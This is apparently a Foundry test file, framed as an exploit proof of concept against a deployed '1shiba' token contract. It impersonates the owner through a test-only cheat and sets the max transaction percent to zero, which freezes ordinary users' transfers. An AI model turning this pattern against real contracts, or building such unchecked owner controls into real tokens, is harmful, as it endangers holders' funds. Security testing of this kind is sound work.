// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IONE1SHIBA {
    function owner() external view returns (address);
    function setMaxTxPercent(uint256 maxTxPercent) external;
    function _maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcc21ec2C6867AC6EFD9cE158996fF47AB5743B2d;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        vm.label(TARGET, "1shiba Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        IONE1SHIBA token = IONE1SHIBA(TARGET);

        // Get the current owner
        address owner = token.owner();
        vm.label(owner, "Contract Owner");

        // Verify initial _maxTxAmount is non-zero
        uint256 initialMaxTx = token._maxTxAmount();
        console.log("Initial _maxTxAmount:", initialMaxTx);
        assertGt(initialMaxTx, 0, "Initial maxTxAmount should be > 0");

        // Exploit: Impersonate owner and set maxTxPercent to 0
        vm.startPrank(owner);
        token.setMaxTxPercent(0);
        vm.stopPrank();

        // Verify the exploit worked - _maxTxAmount should now be 0
        uint256 newMaxTx = token._maxTxAmount();
        console.log("New _maxTxAmount:", newMaxTx);
        assertEq(newMaxTx, 0, "_maxTxAmount should be 0 after exploit");

        // Demonstrate that non-owner transfers are now frozen
        // Any transfer where neither sender nor recipient is owner will fail
        console.log("Vulnerability demonstrated: All user transfers are now frozen!");
        assertEq(newMaxTx, 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
